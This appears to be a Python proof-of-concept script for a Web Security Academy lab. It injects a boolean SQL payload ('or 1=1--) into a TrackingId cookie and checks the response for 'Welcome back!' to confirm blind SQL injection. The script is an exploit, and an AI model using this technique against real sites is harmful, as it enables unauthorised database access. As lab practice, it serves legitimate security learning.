#!/usr/bin/env python3
"""
1emvr@protonmail.com
lab uses TrackingId cookie vulnerable to blind-boolean sqli

database_version: postgresql
parameter_type: string
column_count: 1

"""

import requests
import urllib
import sys
import re

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
headers = {
    "Host": "0a3c003f047e86b780bc1ced00270073.web-security-academy.net",
    "Cookie": "TrackingId=w8dZA9059o2bdQbP; session=J58Ifnfhuan2ZFxxWfUVlHMmeeHklSbs",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://0a3c003f047e86b780bc1ced00270073.web-security-academy.net/",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Te": "trailers"
}


def modify_tracking_id(cookie_header, query):
    tracking_id_match = re.search(r'TrackingId=([^;]*)', cookie_header)

    if not tracking_id_match:
        raise ValueError("TrackingId not found in the cookie header")

    current_tracking_id = tracking_id_match.group(1)
    encoded_string = urllib.parse.quote(query)
    
    new_tracking_id = f"{current_tracking_id}{encoded_string}"
    new_cookie_header = re.sub(r'TrackingId=[^;]*', f'TrackingId={new_tracking_id}', cookie_header)
    
    return new_cookie_header

def response_check():
    cookie_header = modify_tracking_id(headers['Cookie'], "'or 1=1-- ")
    headers['Cookie'] = cookie_header

    response = requests.get(sys.argv[1], headers=headers, proxies=proxies, verify=False)
    if "Welcome back!" in response.text:
        print("good")
    else:
        print("no good")


    
if __name__ == '__main__':
    response_check()
